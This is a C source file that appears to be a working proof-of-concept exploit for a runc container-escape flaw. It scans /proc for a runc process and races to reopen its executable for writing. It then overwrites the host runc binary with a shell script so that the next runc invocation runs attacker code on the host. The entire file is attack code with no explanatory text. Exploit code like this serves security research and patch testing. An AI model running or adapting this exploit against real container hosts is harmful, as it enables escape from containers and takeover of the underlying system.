#include <stdio.h>
#include <stdlib.h>  // exit func
#include <dirent.h>
#include <string.h>
#include <fcntl.h>   // open flags
#include <unistd.h>  // write func


void exploit(int pid) {
    char path[30];
    sprintf(path, "/proc/%i/exe", pid);
    printf("Exploiting PID: %s\n", path);

    int runc_fd_read;
    if ((runc_fd_read = open(path, O_RDONLY)) == -1) {
        puts("Failed to open symlink, exploit failed");
        exit(-1);
    }

    char* new_runc = "#!/bin/bash\necho pwned;id\n";
    char runc_fd_path[24];
    sprintf(runc_fd_path, "/proc/self/fd/%d", runc_fd_read);
    int evil_runc_fd;

    for (unsigned int i=0; i < 4000000000; i++) {
        evil_runc_fd = open(runc_fd_path, O_WRONLY | O_TRUNC);
        if (evil_runc_fd != -1) {
            puts("Time to PWN");
            int wc = write(evil_runc_fd, new_runc, strlen(new_runc));
            if (wc == strlen(new_runc)) {
                puts("Success! Next time runc is run we will get RCE!");
                return;
            }
            
        }
    }
    puts("Disappointment :(");
}

int main(int argc, char** argv) {
    while (1) {
        DIR* dir;
        struct dirent* current_dir;
        dir = opendir("/proc/");
        if (dir) {
            while ((current_dir = readdir(dir)) != NULL) {
                int proc = atoi(current_dir->d_name); 
                if (proc != 0) {
                    char path[30] = {0};
                    sprintf(path, "/proc/%i/cmdline", proc);
                    
                    FILE* f;
                    if ((f = fopen(path, "r")) == NULL) {
                        puts("Error! opening file");
                        continue;
                    }

                    size_t sz = 0;
                    char* cmdline = 0;
                    ssize_t lsz = getline(&cmdline, &sz, f);
                    fclose(f);

                    if (strcmp(cmdline, "/proc/self/exe") == 0) {
                        printf("Found process: %i\n", proc);
                        exploit(proc);
                        exit(0);
                    }
                }
            }
        }
        closedir(dir);
    }
    return 0;
}